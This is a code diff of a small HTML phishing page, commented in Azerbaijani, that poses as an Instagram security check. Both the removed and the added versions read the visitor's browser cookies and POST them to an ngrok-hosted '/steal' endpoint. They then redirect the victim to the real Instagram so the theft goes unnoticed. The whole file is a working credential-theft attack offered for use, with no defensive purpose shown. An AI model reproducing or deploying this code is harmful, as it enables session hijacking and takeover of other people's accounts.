@@ -1,23 +1,28 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Instagram Security Check</title>
-    <script>
-        // 1. Cookie-ləri oğurla və serverə göndər
-        const stolenCookies = document.cookie;
-        fetch('https://7bda-185-146-112-8.ngrok-free.app/steal', {
-            method: 'POST',
-            body: stolenCookies,
-            mode: 'no-cors'
-        });
-
-        // 2. Qurbanı real Instagram-a yönləndir (şübhə doğurmasın)
-        setTimeout(() => {
-            window.location.href = "https://instagram.com";
-        }, 1000);
-    </script>
-</head>
 <body>
-    <h1>Checking your account security...</h1>
+<script>
+  // 1. Cookie-ləri topla
+  const cookies = document.cookie;
+  
+  // 2. Serverə göndər
+  fetch('https://7bda-185-146-112-8.ngrok-free.app/steal', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json' // Əhəmiyyətli!
+    },
+    body: JSON.stringify({ 
+      cookies: cookies,
+      source: 'instagram'
+    })
+  })
+  .then(response => response.json())
+  .then(data => console.log('Server cavabı:', data))
+  .catch(err => console.error('Xəta:', err));
+
+  // 3. İstifadəçini yönləndir
+  setTimeout(() => window.location = "https://instagram.com", 1000);
+</script>
+<p>Yönləndirilir...</p>
 </body>
 </html>
